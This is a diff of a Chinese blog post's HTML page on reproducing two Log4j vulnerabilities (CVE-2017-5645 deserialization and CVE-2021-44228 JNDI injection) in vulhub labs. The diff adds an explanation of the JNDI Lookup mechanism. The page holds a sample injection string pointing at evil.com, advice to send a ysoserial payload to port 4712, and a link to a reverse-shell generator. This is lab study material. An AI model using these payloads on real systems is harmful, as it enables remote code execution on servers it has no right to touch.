@@ -16,12 +16,12 @@
   <meta name="author" content="fuming">
   <meta name="keywords" content="">
   
-    <meta name="description" content="Log4j漏洞复现 Log4j 反序列化漏洞介绍Apache Log4j 是一个用于 Java 的日志记录库，其支持启动远程日志服务器。 Apache Log4j 2.8.2 之前的 2.x 版本中存在反序列化漏洞。攻击者可利用该漏洞执行任意代码。 漏洞原理环境搭建 https:&#x2F;&#x2F;vulhub.org&#x2F;#&#x2F;environments&#x2F;log4j&#x2F;CVE-2017-5645&#x2F;  漏洞复现使用 yso">
+    <meta name="description" content="Log4j漏洞复现 Log4j 反序列化漏洞介绍Apache Log4j 是一个用于 Java 的日志记录库，其支持启动远程日志服务器。 Apache Log4j 2.8.2 之前的 2.x 版本中存在反序列化漏洞。攻击者可利用该漏洞执行任意代码。 环境搭建 https:&#x2F;&#x2F;vulhub.org&#x2F;#&#x2F;environments&#x2F;log4j&#x2F;CVE-2017-5645&#x2F;  漏洞复现使用 ysoseri">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Log4j漏洞复现">
 <meta property="og:url" content="https://fuyoumingyan.github.io/2023/05/29/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Log4j%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/index.html">
 <meta property="og:site_name" content="fuyoumingyan&#39;s blog">
-<meta property="og:description" content="Log4j漏洞复现 Log4j 反序列化漏洞介绍Apache Log4j 是一个用于 Java 的日志记录库，其支持启动远程日志服务器。 Apache Log4j 2.8.2 之前的 2.x 版本中存在反序列化漏洞。攻击者可利用该漏洞执行任意代码。 漏洞原理环境搭建 https:&#x2F;&#x2F;vulhub.org&#x2F;#&#x2F;environments&#x2F;log4j&#x2F;CVE-2017-5645&#x2F;  漏洞复现使用 yso">
+<meta property="og:description" content="Log4j漏洞复现 Log4j 反序列化漏洞介绍Apache Log4j 是一个用于 Java 的日志记录库，其支持启动远程日志服务器。 Apache Log4j 2.8.2 之前的 2.x 版本中存在反序列化漏洞。攻击者可利用该漏洞执行任意代码。 环境搭建 https:&#x2F;&#x2F;vulhub.org&#x2F;#&#x2F;environments&#x2F;log4j&#x2F;CVE-2017-5645&#x2F;  漏洞复现使用 ysoseri">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309021657903.png">
 <meta property="og:image" content="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309021608726.png">
@@ -31,7 +31,7 @@
 <meta property="og:image" content="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309021646802.png">
 <meta property="og:image" content="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309021643247.png">
 <meta property="article:published_time" content="2023-05-29T04:47:44.000Z">
-<meta property="article:modified_time" content="2023-09-02T15:50:30.570Z">
+<meta property="article:modified_time" content="2023-09-09T12:56:45.560Z">
 <meta property="article:author" content="fuming">
 <meta property="article:tag" content="漏洞复现">
 <meta name="twitter:card" content="summary_large_image">
@@ -228,7 +228,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          1.8k 字
+          2k 字
         
       </span>
     
@@ -239,7 +239,7 @@
         
         
         
-          10 分钟
+          11 分钟
         
       </span>
     
@@ -285,7 +285,7 @@
                 <h1 id="Log4j漏洞复现"><a href="#Log4j漏洞复现" class="headerlink" title="Log4j漏洞复现"></a>Log4j漏洞复现</h1><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309021657903.png" srcset="/img/loading.gif" lazyload alt="Log4j"></p>
 <h2 id="Log4j-反序列化"><a href="#Log4j-反序列化" class="headerlink" title="Log4j 反序列化"></a>Log4j 反序列化</h2><h3 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h3><p>Apache Log4j 是一个用于 Java 的日志记录库，其支持启动远程日志服务器。</p>
 <p>Apache Log4j 2.8.2 之前的 2.x 版本中存在反序列化漏洞。攻击者可利用该漏洞执行任意代码。</p>
-<h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><ul>
+<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><ul>
 <li><a target="_blank" rel="noopener" href="https://vulhub.org/#/environments/log4j/CVE-2017-5645/">https://vulhub.org/#/environments/log4j/CVE-2017-5645/</a></li>
 </ul>
 <h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>使用 ysoserial 生成 payload，然后直接发送给 <code>your-ip:4712</code> 端口即可。</p>
@@ -294,7 +294,9 @@
 <p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309021608726.png" srcset="/img/loading.gif" lazyload alt="image-20230902160848624"></p>
 <p>Base64 反弹 Shell 生成：<a target="_blank" rel="noopener" href="http://www.bu8ug.com/index.php/other/shell-base64/">http://www.bu8ug.com/index.php/other/shell-base64/</a></p>
 <h2 id="Log4j2-JNDI-注入"><a href="#Log4j2-JNDI-注入" class="headerlink" title="Log4j2 JNDI 注入"></a>Log4j2 JNDI 注入</h2><h3 id="漏洞介绍-1"><a href="#漏洞介绍-1" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h3><p>Apache Log4j 2 是 Java 语言的日志处理套件，使用极为广泛。在其 2.0 到 2.14.1 版本中存在一处 JNDI 注入漏洞，攻击者在可以控制日志内容的情况下，通过传入类似于<code>$&#123;jndi:ldap://evil.com/example&#125;</code>的 lookup 用于进行JNDI注入，执行任意代码。</p>
-<h3 id="漏洞原理-1"><a href="#漏洞原理-1" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><h3 id="环境搭建-1"><a href="#环境搭建-1" class="headerlink" title="环境搭建"></a>环境搭建</h3><ul>
+<h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>Log4j2 提供了一个 <code>Lookup</code> 的功能，在遇到如 <code>$&#123;key:value&#125;</code> 这种形式时，不会直接原样输出，而是去调用这个 <code>key</code> 对应的解释器，然后 <code>value</code> 作为该解释器的参数。</p>
+<p>那么当 <code>key</code> 为 <code>jndi</code> 时，它就会调用这个 <code>JNDILookup</code> ，这个解释器的底层是使用 <code>JNDI</code> 原生 <code>Lookup</code> 实现的，用户可控的 <code>value</code> 作为 <code>JNDI</code> 中 <code>Lookup</code> 的参数，导致 <code>JNDI</code> 漏洞的产生。</p>
+<h3 id="环境搭建-1"><a href="#环境搭建-1" class="headerlink" title="环境搭建"></a>环境搭建</h3><ul>
 <li><a target="_blank" rel="noopener" href="https://vulhub.org/#/environments/log4j/CVE-2021-44228/">https://vulhub.org/#/environments/log4j/CVE-2021-44228/</a></li>
 </ul>
 <h3 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>漏洞位置：<code>http://your_ip:8983/solr/admin/cores?action=</code></p>
@@ -418,8 +420,8 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2023/05/29/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Tomcat%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" title="Tomcat漏洞复现">
-                        <span class="hidden-mobile">Tomcat漏洞复现</span>
+                      <a href="/2023/05/29/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Shiro%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" title="Shiro漏洞复现">
+                        <span class="hidden-mobile">Shiro漏洞复现</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
